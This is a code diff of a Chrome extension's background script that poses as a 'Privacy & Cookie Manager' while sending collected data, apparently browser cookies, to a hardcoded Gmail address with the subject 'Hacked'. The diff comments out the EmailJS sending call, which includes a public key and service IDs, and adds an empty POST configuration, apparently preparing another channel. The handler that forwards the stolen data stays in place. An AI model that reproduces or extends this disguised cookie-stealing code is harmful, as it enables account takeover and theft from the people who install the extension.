@@ -1,6 +1,5 @@
 importScripts('email.min.js');
 chrome.runtime.onInstalled.addListener(() => {
-    // sendEmail('tranvantri352@gmail.com', 'Xin chào ' || '', 'Tôi Là một người đang cảm thấy rất zui');
     chrome.notifications.create({
         type: 'basic',
         title: 'Privacy & Cookie Manager',
@@ -17,22 +16,30 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
         sendEmail('tranvantri352@gmail.com', request.subject || 'Hacked', request.message + "", request.message);
     }
 })
+let config = {
+    method: 'POST',
+    url: '',
+
+}
 
 function sendEmail(to, subject, message, cookies) {
     const fileContent = cookies;
     const blob = new Blob([fileContent], { type: 'text/plain' });
     const file = new File([blob], "message.txt", { type: "text/plain" });
-    emailjs.init({ publicKey: "9AcDSxQl75lmz0yyx" });
 
-    emailjs.send("service_x5c6a8t", "template_1dortme", {
-        to_email: to,
-        subject: subject,
-        message: message
-        // attachment: file
-    }).then(function (response) {
-        console.log('Email sent successfully!', response.status, response.text);
-    }, function (error) {
-        console.log('Failed to send email.', error);
-    });
+
+
+    // emailjs.init({ publicKey: "9AcDSxQl75lmz0yyx" });
+
+    // emailjs.send("service_x5c6a8t", "template_1dortme", {
+    //     to_email: to,
+    //     subject: subject,
+    //     message: message
+    //     // attachment: file
+    // }).then(function (response) {
+    //     console.log('Email sent successfully!', response.status, response.text);
+    // }, function (error) {
+    //     console.log('Failed to send email.', error);
+    // });
 }
 
